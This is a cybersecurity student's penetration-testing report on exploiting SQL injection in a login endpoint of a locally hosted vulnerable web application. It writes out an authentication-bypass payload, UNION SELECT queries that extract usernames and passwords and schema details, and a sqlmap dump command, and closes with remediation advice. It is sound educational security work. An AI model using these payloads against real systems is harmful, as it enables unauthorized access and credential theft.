# FUTURE_CS_01
FUTURE_CS_01 
Web ApplicationSecurity
AssessmentSQL Injection Exploitation Date:  July 7,2025
Conducted by:  Safik Rahman 
1.Introduction
This report presents the findings and technical methodology employed during a webapplication security assessment. The primary aim was to uncover vulnerabilities such asSQL Injection, Cross-Site Scripting (XSS), and authentication flaws in a simulatedenvironment. This document specifically highlights the successful discovery andexploitation of a SQL Injection flaw.
2. ObjectiveThe objective was to assess the application's resilience against real-world attack vectorsby performing ethical penetration testing. Special focus was given to detecting SQLInjection vulnerabilities that could potentially allow unauthorized data access withoutaffecting system integrity.
3. Tools and Environment•Operating System:  Kali Linux•Manual Tools:  Web browser, Custom SQL payloads•Automated Tools:  sqlmap•Target Application:  Localhost-hosted vulnerable web application
4. Vulnerability Identified: SQL Injection
4.1 Entry Point:• HTTP Method:  POST• Endpoint:/rest/user/login• Vulnerable Parameters:email, password
4.2 Initial PayloadUsed:'OR'1'='1'--This payload bypassed authentication by manipulating the SQL logic, granting accesswithout valid credentials.
5. Exploitation Process
Step 1: Column EnumerationPayloads using theORDER BY clause were tested to determine the number of columnsinvolved in the SQLquery:' ORDER BY 1 -- ' ORDER BY 2 --
Step 2: Union Injection Confirmation' UNION SELECT 'test', 'output' --This confirmed the number of injectable and displayable columns.
Step 3: Data ExtractionOnce confirmed, real user data was retrieved using:' UNION SELECT username, password FROM users --
Step 4: Schema DiscoveryIf table/column names are unknown, the following was used:' UNION SELECT table_name, null FROM information_schema.tables --' UNION SELECT column_name, null FROM information_schema.columns WHEREtable_name='users' --
Step 5: Automated Extraction with sqlmapsqlmap -u "http://localhost:3000/rest/user/login"  \--data="email=test&password=test" \--dump --batchSqlmap was usedto automate and validatethe exploitation and data retrieval.
7. RecommendationsTo remediate the SQL Injection vulnerability, the following countermeasures are advised:
• Parameterized Queries:  Replace dynamic SQL queries with prepared statements.
• Input Validation:  Enforce strong server-side input sanitization using allowlists.
• Use ORM Frameworks:  Implement Object-Relational Mapping to abstract SQLlogic.• Web Application Firewall (WAF):  Deploy WAF to detect and block maliciousinputs.• Database Privilege Management:  Limit database user permissions to the bareminimum required.
8. ConclusionThis security assessment revealed a critical SQL Injection flaw in the login endpoint.Successful exploitation demonstrated the potential for unauthorized access and databasecompromise. All testing was performed ethically in a controlled environment, with the goalof improving the application's overall security posture.
Report Prepared By:Safik Rahman
Cybersecurity Student
Date:  July 7, 2025
